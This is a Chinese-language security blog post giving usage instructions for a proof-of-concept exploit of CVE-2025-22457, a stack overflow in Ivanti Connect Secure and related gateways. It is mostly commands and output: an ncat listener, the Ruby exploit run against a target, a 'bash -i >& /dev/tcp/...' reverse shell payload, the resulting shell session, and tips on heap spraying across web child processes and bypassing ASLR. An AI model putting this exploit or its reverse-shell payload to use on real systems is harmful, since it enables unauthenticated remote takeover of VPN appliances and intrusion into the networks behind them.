#  CVE-2025-22457   
 Khan安全团队   2025-04-13 02:36  
  
远程未经身份验证的基于堆栈的缓冲区溢出漏洞影响 Ivanti Connect Secure、Pulse Connect Secure、Ivanti Policy Secure 和 ZTA 网关。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV22lv9nuQ2RNSCtD6UuMnCEZmM0LfjbY3G7cDCzg9UJEFgpzLvv9rvXW9WPdxUanb9Siaoq4piaxgmg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV22lv9nuQ2RNSCtD6UuMnCE1WutGrEjXHhEib0f5xc7dYrruD2hFAlibvXAqAQVpSiaANNzwNyb3HQsw/640?wx_fmt=png&from=appmsg "")  
  
  
针对存在漏洞的 Ivanti Connect Secure 目标（版本 22.7r2.4）运行此脚本，如下所示：  
  
启动 netcat 监听器来捕获反向 shell。  
```
C:\>ncat -lnvkp 8080
```  
  
运行漏洞利用程序并强制执行 ASLR（这会很慢）  
```
C:\>ruby CVE-2025-22457.rb -t 192.168.86.111 -p 443 --lhost 192.168.86.35 --lport 8080
[2025-04-10 16:21:13 +0100] [+] Targeting https://192.168.86.111:443/
[2025-04-10 16:21:13 +0100] [+] Payload: bash -i >& /dev/tcp/192.168.86.35/8080 0>&1
[2025-04-10 16:21:13 +0100] [+] Detected version 22.7.2.3597
[2025-04-10 16:21:13 +0100] [+] Starting...
[2025-04-10 16:21:13 +0100] [+] Attempt 0, trying libdsplibs.so @ 0xf64ca000
[2025-04-10 16:21:13 +0100]     Making connections...
[2025-04-10 16:21:18 +0100]     Spraying...
[2025-04-10 16:22:27 +0100]     Triggering..
```  
  
当它起作用时，你将获得一个反向shell。  
```
C:\>ncat -lnvkp 8080
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 192.168.86.111.
Ncat: Connection from 192.168.86.111:20746.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.2$ id
id
uid=104(nr) gid=104(nr) groups=104(nr)
bash-4.2$ uname -a
uname -a
Linux localhost2 4.17.00.35-selinux-jailing-production #1 SMP Tue Jun 18 16:25:33 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
bash-4.2$
```  
  
Web子进程  
  
根据底层硬件，目标设备可用的 CPU 数量将决定二进制文件将生成的子进程数量/home/bin/web。由于所有传入的 HTTPS 请求都将均匀分布在这些子进程之间，我们需要考虑到这一点，并对所有子进程执行足够次数的堆喷射。我们需要这样做，因为当我们触发漏洞时，我们无法知道会在哪个子进程中触发它。因此，我们需要在每个子进程中都进行堆喷射。  
- 1 个 vCPU - 1 个 Web 进程，无子进程  
- 2 个 vCPU - 1 个 Web 父节点，2 个子节点  
- 4 个 vCPU - 1 个 Web 父级，4 个子级（这是默认值，对应于 Ivanti Connect Secure ISA4000-V 平台）  
- 8 个 vCPU - 1 个 Web 父节点，8 个子节点（这对应于 Ivanti Connect Secure ISA6000-V 平台）  
例如，在具有 root 权限的易受攻击的设备中，运行以下命令查看子进程的数量/home/bin/web：  
```
bash-4.2# ps -Al | grep web
ps -Al | grep web
4 S   104  3012  2394  0  80   0 - 26313 -      ?        00:00:00 web
4 S   104  3013  2394  0  80   0 - 24931 -      ?        00:00:00 web80
1 S   104  4947  3012  2  80   0 - 28209 -      ?        00:01:27 web
1 S   104  5217  3012  1  80   0 - 31527 -      ?        00:00:49 web
1 S   104  5695  3012  0  80   0 - 28199 -      ?        00:00:00 web
1 S   104  5715  3012  0  80   0 - 28199 -      ?        00:00:00 web
bash-4.2#
```  
  
您可以通过参数指定预期的网络子项数量--web_children，例如：  
```
C:\>ruby CVE-2025-22457.rb -t 192.168.86.111 -p 443 --lhost 192.168.86.35 --lport 8080 --web_children 4
```  
  
libdsplibs基地址  
  
如果您在本地系统上测试 PoC，可能需要避免暴力破解libdsplibs基址。在这种情况下，您可以通过参数将已知的基址传递给 PoC --libdsplibs。例如，在已 root 权限的易受攻击设备中，运行以下命令：  
```
bash-4.2# ps -A| grep web
ps -A| grep web
 3200 ?        00:00:01 web80
20536 ?        00:00:02 web
bash-4.2# cat /proc/20536/maps | grep libdsplibs
cat /proc/20536/maps | grep libdsplibs
f642e000-f7994000 r-xp 00000000 fc:02 171879                             /home/lib/libdsplibs.so
f7994000-f7995000 ---p 01566000 fc:02 171879                             /home/lib/libdsplibs.so
f7995000-f79aa000 r--p 01566000 fc:02 171879                             /home/lib/libdsplibs.so
f79aa000-f79e3000 rw-p 0157b000 fc:02 171879                             /home/lib/libdsplibs.so
bash-4.2#
```  
  
然后，您可以将已知的基地址传递给 PoC，如下所示：  
```
C:\>ruby CVE-2025-22457.rb -t 192.168.86.111 -p 443 --lhost 192.168.86.35 --lport 8080 --web_children 4 --libdsplibs 0xf642e000
[2025-04-10 16:21:13 +0100] [+] Targeting https://192.168.86.111:443/
[2025-04-10 16:21:13 +0100] [+] Payload: bash -i >& /dev/tcp/192.168.86.35/8080 0>&1
[2025-04-10 16:21:13 +0100] [+] Detected version 22.7.2.3597
[2025-04-10 16:21:13 +0100] [+] Starting...
[2025-04-10 16:21:13 +0100] [+] Attempt 0, trying libdsplibs.so @ 0xf642e000
[2025-04-10 16:21:13 +0100]     Making connections...
[2025-04-10 16:21:18 +0100]     Spraying...
[2025-04-10 16:22:27 +0100]     Triggering...
```  
  
  
